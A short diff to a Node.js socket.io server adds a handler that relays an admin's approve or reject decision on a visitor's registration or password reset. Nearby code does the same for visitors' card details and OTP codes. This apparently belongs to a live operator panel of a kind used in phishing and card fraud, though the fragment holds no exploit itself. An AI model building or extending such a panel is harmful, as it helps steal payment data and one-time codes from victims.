@@ -817,6 +817,20 @@ io.on("connection", (socket) => {
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
 
+  // Admin: Registration/Forgot password action (Approve, Reject)
+  socket.on("admin:regAction", ({ visitorSocketId, action }) => {
+    io.to(visitorSocketId).emit("reg:action", { action });
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
+    console.log(`Reg action ${action} sent to visitor ${visitorSocketId}`);
+  });
+
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
     io.to(visitorSocketId).emit("code:action", { action, codeIndex });
